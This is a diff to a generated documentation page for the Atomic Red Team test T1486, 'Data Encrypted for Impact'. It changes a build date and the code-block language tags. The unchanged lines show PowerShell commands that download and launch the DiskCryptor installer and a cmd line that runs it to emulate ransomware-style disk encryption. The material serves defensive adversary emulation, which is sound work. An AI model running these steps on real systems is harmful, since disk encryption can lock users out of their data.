@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1486"
 attack_technique_name: "Data Encrypted for Impact"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "44b68e11-9da2-4d45-a0d9-893dabd60f30"
@@ -52,13 +52,13 @@ dcrypt_setup will be installed at specified location (#{dcrypt_exe})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "${env:ProgramFiles}/dcrypt/#{dcrypt_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Write-Host Downloading DiskCryptor installer
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe" -OutFile      "PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"
@@ -73,7 +73,7 @@ Start-Process "PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.
 
 ### Command
 
-```commandprompt
+```cmd
 ""%PROGRAMFILES%\dcrypt"\#{dcrypt_exe}"
 ```
 
